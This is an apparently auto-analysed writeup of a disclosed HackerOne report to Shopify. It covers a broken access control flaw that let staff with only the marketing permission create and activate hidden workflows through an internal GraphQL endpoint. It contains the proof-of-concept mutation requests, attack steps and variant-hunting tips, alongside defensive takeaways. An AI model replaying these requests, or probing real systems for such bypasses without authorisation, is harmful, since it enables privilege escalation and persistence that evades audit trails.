# Staff can create workflows in Shopify Admin without apps permission

## Metadata
- **Source:** HackerOne
- **Report:** 1521336 | https://hackerone.com/reports/1521336
- **Submitted:** 2022-03-24
- **Reporter:** jmp_35p
- **Program:** Shopify
- **Bounty:** Not specified in writeup
- **Severity:** High
- **Vuln:** Broken Access Control, Authorization Bypass, Privilege Escalation
- **CVEs:** None
- **Category:** uncategorised

## Summary
A staff member with only 'marketing' permission can access the undocumented `/admin/internal/web/graphql/flow` endpoint to create and activate workflows without requiring the Shopify Flow app or Shopify Plus organization access. This bypasses intended authorization controls and allows privilege escalation to functionality that should be restricted.

## Attack scenario
1. Attacker logs in as staff member with limited 'marketing' permission only
2. Attacker discovers the internal GraphQL endpoint `/admin/internal/web/graphql/flow` through reconnaissance
3. Attacker sends a GraphQL mutation `templateInstall` to install a pre-existing workflow template
4. Attacker sends a GraphQL mutation `workflowActivate` to activate the installed workflow
5. Attacker creates automated workflows (e.g., customer tagging on registration) that execute without appearing in the UI
6. Workflows operate silently and can only be discovered by querying the same internal endpoint

## Root cause
Missing or improperly implemented authorization checks on the internal GraphQL flow endpoint. The endpoint only validates basic staff authentication but fails to verify required permissions (should require app installation or Shopify Plus organization status). Authorization logic was likely bypassed or not applied to this internal endpoint.

## Attacker mindset
Opportunistic insider threat or compromised staff account seeking to automate malicious workflows. Could modify customer data, trigger unwanted actions, or establish persistence through automation that evades UI-based audit trails. The stealth aspect (workflows hidden from UI) suggests intent to avoid detection.

## Defensive takeaways
- Implement proper authorization checks on ALL endpoints, including internal/undocumented ones
- Validate that users possess required permissions (app installation, Shopify Plus status) before granting workflow access
- Audit and expose all internal endpoints - don't rely on obscurity for security
- Ensure all user actions are logged and visible in UI regardless of access method
- Apply principle of least privilege - restrict GraphQL mutations based on user roles
- Implement rate limiting and anomaly detection for workflow creation
- Regular security review of permission models across feature access

## Variant hunting
Check other `/admin/internal/` endpoints for similar authorization bypasses
Test if other low-privilege roles (support, viewer) can access the flow endpoint
Examine other GraphQL mutations beyond `templateInstall` and `workflowActivate` on this endpoint
Look for similar patterns in other Shopify admin features with multi-access methods
Check if other 'internal' endpoints lack proper permission validation
Test if workflows can be modified/deleted beyond just creation and activation

## MITRE ATT&CK
- T1190
- T1078.002
- T1548.002
- T1199
- T1059.001

## Notes
The vulnerability is particularly concerning because workflows created via this method are invisible in the normal UI, making them difficult to audit or detect. This suggests the internal endpoint may have been created for development/testing purposes and accidentally left accessible. The ability to leverage pre-existing templates makes the attack low-friction. No mention of scope (single shop vs multi-shop) or which templates could be abused for maximum impact.

## Full report
<details><summary>Expand</summary>

## Summary:
[add summary of the vulnerability]

According to publicly available docs, Flow can be accessed in two ways.
1. through the Shopify organization admin (Shopify plus)
2. by installing the Shopify Flow app.
I stumbled on /admin/internal/web/graphql/flow endpoint which is accessible to a staff member with only `marketing` permission. The said endpoint makes it possible to create workflows and perform other flow related actions without using any of the two methods stated above. To substantiate my claim, I created a workflow that 'adds a tag whenever a customer registers an account' (created an account tag) see the image below for details.
{F1667015} 

It's worth mentioning that the workflows created this way don't show up in the app or any where else, information about them can only be gotten by hitting the same endpoint. There are couple of other mutations that are accessible but I used only `templateInstall` and `workflowActivate` for demonstration. What follows below are example GraphQL queries and steps to reproduce.
First, we need to install a template to activate. 
See the image below for details
{F1667014}

```
{"operationName":"templateInstall","variables":{"templateId":"977bf9aa-ae6a-4a7c-b3f2-051c9e856c6f","shopIds":[]},"query":"mutation templateInstall($templateId: ID!, $shopIds: [ID!]!) {\n  templateInstall(templateId: $templateId, shopIds: $shopIds) {\n    installed {\n      shopId\n      workflowId\n      workflowVersion\n      __typename\n    }\n    errors {\n      shopId\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}

```
After installing a template of our choice, we then activate the workflow. 
See the image below for details.
{F1667018}

```
{"operationName":"activateWorkflowMutation","variables":{"workflowId":"240ed0ee-d099-4066-8eac-7ce777ef4fe4","version":"acc5731a-7802-4622-857b-0191f8c0ee9d","contextType":"shop","contextId":"10979704928"},"query":"mutation activateWorkflowMutation($workflowId: ID!, $version: String, $contextType: String!, $contextId: ID!) {\n  workflowActivate(\n    workflowId: $workflowId\n    version: $version\n    contextType: $contextType\n    contextId: $contextId\n  ) {\n    workflow {\n      ...workflow\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment workflow on Workflow {\n  id\n  name\n  steps {\n    ...step\n    __typename\n  }\n  links {\n    ...link\n    __typename\n  }\n  activations {\n    ...activation\n    __typename\n  }\n  lastUpdated\n  activationState\n  versionState\n  version\n  parentVersion\n  shopifyDomain\n  shopifyName\n  owner {\n    contextId\n    contextType\n    __typename\n  }\n  ...validationErrors\n  tags\n  __typename\n}\n\nfragment step on Step {\n  id\n  task {\n    ...task\n    __typename\n  }\n  position {\n    x\n    y\n    __typename\n  }\n  inputPort {\n    name\n    identifier\n    __typename\n  }\n  outputPorts {\n    name\n    identifier\n    __typename\n  }\n  ...stepConfig\n  note\n  description\n  __typename\n}\n\nfragment task on Task {\n  id\n  label\n  description\n  dynamicDescriptionTemplate\n  taskType\n  path\n  inputPort {\n    id\n    name\n    __typename\n  }\n  outputPorts {\n    id\n    name\n    __typename\n  }\n  iconUrl\n  documentationUrl\n  __typename\n}\n\nfragment stepConfig on Step {\n  id\n  taskType\n  task {\n    id\n    label\n    description\n    __typename\n  }\n  configFields {\n    __typename\n    ... on ArrayConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      supportsLiquid\n      description\n      label\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on CollectionsConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      errors {\n        title\n        message\n        __typename\n      }\n      __typename\n    }\n    ... on BooleanConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on MapConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      supportsLiquid\n      description\n      label\n      keyHeader\n      valueHeader\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on SelectConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      options {\n        label\n        value\n        __typename\n      }\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on TextConfigField {\n      valuePlaceholder\n      supportsLiquid\n      stepConfigFieldIdentifier\n      description\n      label\n      rows\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on CommerceObjectConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      possibleObjectTypes\n      __typename\n    }\n    ... on IntegerConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on FloatConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on MarketingActivityConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on DurationConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      possibleUnits\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on WeightConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      possibleUnits\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on RecurrenceConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on ShippingPackageConfigField {\n      defaultValue\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      errors {\n        title\n        message\n        __typename\n      }\n      __typename\n    }\n    ... on ShippingCarrierServicesConfigField {\n      defaultValue\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      errors {\n        title\n        message\n        __typename\n      }\n      __typename\n    }\n  }\n  condition {\n    __typename\n    ... on LogicalExpression {\n      uuid\n      lhsOperationUuid\n      logicalOperator: operator\n      rhsOperationUuid\n      parentUuid\n      __typename\n    }\n    ... on ArrayExpression {\n      uuid\n      arrayPathUuid\n      arrayItemKeyUuid\n      arrayOperator: operator\n      operationUuid\n      parentUuid\n      __typename\n    }\n    ... on Comparison {\n      uuid\n      lhsUuid\n      comparisonOperator: operator\n      rhsUuid\n      valueType\n      p

</details>

---
*Analysed by Claude on 2026-05-24*
